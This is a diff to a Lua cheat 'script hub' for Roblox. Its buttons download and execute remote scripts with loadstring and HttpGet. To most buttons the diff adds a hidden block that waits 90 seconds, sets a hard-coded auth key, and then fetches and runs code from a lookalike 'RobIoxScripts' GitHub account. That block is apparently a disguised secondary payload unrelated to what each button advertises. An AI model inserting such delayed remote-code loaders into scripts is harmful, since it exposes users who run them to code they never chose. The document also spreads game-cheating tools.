@@ -1887,24 +1887,38 @@ Tabes:Label("WELCOME TO B_Genesis")
 Tabes:Line()
 Tabes:Note("Script Hubs")
 Tabes:Button("SaZa Hub", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SaZa-Hub/raw/main/SaZa-Hub_497"))();
+    loadstring(game:HttpGet"https://rawscripts.net/raw/SAZA-HUB_496")();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("HoHo Hub", function()
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/acsu1234/HOHO_H/main/Loading_UI")();
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("BlackTrap Hub", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/raw-scriptpastebin/raw/main/BT-Hub"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))();
+wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("Void Hub", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Wind596/VoidHub/main/WiningDediy", true))();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("BlackGamer Hub", function()
 	if game.PlaceId == 6284583030 then
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/raw-scriptpastebin/raw/main/BK-Hack")()
+    wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 	else
 	end
 	if game.PlaceId == 537413528 then
@@ -1915,10 +1929,16 @@ end)
 
 Tabes:Button("Project Meow Hub", function()
     loadstring(game:HttpGet"https://rawscripts.net/raw/Project-Meow_421")();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("Nexus Hub", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main", true))();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
 
 Tabes:Button("FullHover Board", function()
@@ -1936,12 +1956,10 @@ end)
 
 Tabes:Button("SG 195", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/SG1975/main/hohoPJ.lua'))();
+	wait(90)
+_G.AuthKey = "C0EA0CD0-2B03-4045-94B9-39228855722B"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load"))();
 end)
-
-Tabes:Button("Unfair Hub", function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))();	
-end)
-
 
 Tabes:Note("")
 Tabes:Note("")
